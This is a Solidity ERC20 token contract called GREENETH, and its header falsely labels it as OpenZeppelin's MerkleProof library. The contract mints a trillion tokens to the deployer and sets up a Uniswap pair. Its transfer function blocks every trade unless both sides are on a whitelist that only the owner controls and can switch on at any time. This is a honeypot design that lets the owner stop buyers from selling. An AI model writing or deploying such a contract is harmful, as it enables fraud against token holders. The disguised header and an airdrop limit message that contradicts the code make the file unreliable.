// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.8.0) (utils/cryptography/MerkleProof.sol)

pragma solidity ^0.8.0;


import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

library SafeMathInt {
  int256 private constant MIN_INT256 = int256(1) << 255;
  int256 private constant MAX_INT256 = ~(int256(1) << 255);

  function mul(int256 a, int256 b) internal pure returns (int256) {
    int256 c = a * b;

    require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
    require((b == 0) || (c / b == a));
    return c;
  }

  function div(int256 a, int256 b) internal pure returns (int256) {
    require(b != -1 || a != MIN_INT256);

    return a / b;
  }

  function sub(int256 a, int256 b) internal pure returns (int256) {
    int256 c = a - b;
    require((b >= 0 && c <= a) || (b < 0 && c > a));
    return c;
  }

  function add(int256 a, int256 b) internal pure returns (int256) {
    int256 c = a + b;
    require((b >= 0 && c >= a) || (b < 0 && c < a));
    return c;
  }

  function abs(int256 a) internal pure returns (int256) {
    require(a != MIN_INT256);
    return a < 0 ? -a : a;
  }
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


contract GREENETH is Ownable, ERC20 {
    using SafeMath for uint256;
    using SafeMathInt for int256;

    bool public enableWhitel;
    mapping(address => bool) public whitelists;

    constructor() ERC20("GREENETH", "GRE") {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        _approve(address(this), address(_router), ~uint256(0));
        _approve(msg.sender, address(_router), ~uint256(0));
        
        _mint(msg.sender, 1000000000000 * 10**18);

        enableWhitel = true;
        whitelists[msg.sender] = true;
        whitelists[address(this)] = true;
        whitelists[address(_router)] = true;
        whitelists[_pair] = true;
    }

    function _transfer(address from, address to, uint256 amount) override internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(enableWhitel && owner() != from && owner() != to) {
            require(whitelists[from]==true && whitelists[to]==true, "whitelist");
        }

        super._transfer(from, to, amount);
    }


    function settwhite(address accounts, bool _iswhitelisting) external onlyOwner {
        whitelists[accounts] = _iswhitelisting;
    }

    function settwhitelist(address[] memory accounts, bool _iswhitelisting) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            whitelists[accounts[i]] = _iswhitelisting;
        }
    }

    function setEnableWhitel(bool isEnableWhitel)  external onlyOwner {
        enableWhitel = isEnableWhitel;
    }

    function multiTransfer(address[] calldata addresses, uint256[] calldata amounts) external {
        require(addresses.length < 801, "GAS Error: max airdrop limit is 500 addresses");
        require(addresses.length == amounts.length, "Mismatch between Address and token count");

        uint256 sum = 0;
        for (uint256 i = 0; i < addresses.length; i++) {
            sum = sum + amounts[i];
        }

        require(balanceOf(msg.sender) >= sum, "Not enough amount in wallet");
        for (uint256 i = 0; i < addresses.length; i++) {
            _transfer(msg.sender, addresses[i], amounts[i]);
        }
    }

    function multiTransfer_fixed(address[] calldata addresses, uint256 amount) external {
        require(addresses.length < 2001, "GAS Error: max airdrop limit is 2000 addresses");

        uint256 sum = amount.mul(addresses.length);
        require(balanceOf(msg.sender) >= sum, "Not enough amount in wallet");

        for (uint256 i = 0; i < addresses.length; i++) {
            _transfer(msg.sender, addresses[i], amount);
        }
    }



    receive() external payable {}
}